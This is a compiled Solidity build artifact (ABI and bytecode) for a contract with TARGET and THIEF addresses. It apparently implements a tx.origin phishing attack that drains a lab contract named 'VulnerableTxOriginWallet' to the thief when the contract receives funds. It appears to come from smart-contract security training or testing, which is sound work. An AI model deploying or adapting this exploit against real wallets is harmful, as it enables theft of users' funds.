{"abi":[{"type":"constructor","inputs":[{"name":"targetAddress","type":"address","internalType":"address payable"},{"name":"thiefAddress","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableTxOriginWallet"}],"stateMutability":"view"},{"type":"function","name":"THIEF","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address payable"}],"stateMutability":"view"}],"bytecode":{"object":"0x60c060405234801561000f575f80fd5b506040516103e03803806103e0833981810160405281019061003191906100fe565b8173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250508073ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff1681525050505061013c565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100cd826100a4565b9050919050565b6100dd816100c3565b81146100e7575f80fd5b50565b5f815190506100f8816100d4565b92915050565b5f8060408385031215610114576101136100a0565b5b5f610121858286016100ea565b9250506020610132858286016100ea565b9150509250929050565b60805160a0516102776101695f395f8181606f015261012f01525f81816033015261015301526102775ff3fe60806040526004361061002c575f3560e01c8063aa81d131146100d9578063cc1f2afa14610103576100d5565b366100d5577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a3a7e7f37f00000000000000000000000000000000000000000000000000000000000000006040518263ffffffff1660e01b81526004016100aa91906101b4565b5f604051808303815f87803b1580156100c1575f80fd5b505af11580156100d3573d5f803e3d5ffd5b005b5f80fd5b3480156100e4575f80fd5b506100ed61012d565b6040516100fa91906101b4565b60405180910390f35b34801561010e575f80fd5b50610117610151565b6040516101249190610228565b60405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000081565b7f000000000000000000000000000000000000000000000000000000000000000081565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61019e82610175565b9050919050565b6101ae81610194565b82525050565b5f6020820190506101c75f8301846101a5565b92915050565b5f819050919050565b5f6101f06101eb6101e684610175565b6101cd565b610175565b9050919050565b5f610201826101d6565b9050919050565b5f610212826101f7565b9050919050565b61022281610208565b82525050565b5f60208201905061023b5f830184610219565b9291505056fea26469706673582212203688361ebe9c981f8f3384bed7af8c669ffb8518d2cbb4463a1cc54679a4fa1064736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"TARGET()":"cc1f2afa","THIEF()":"aa81d131"},"id":19}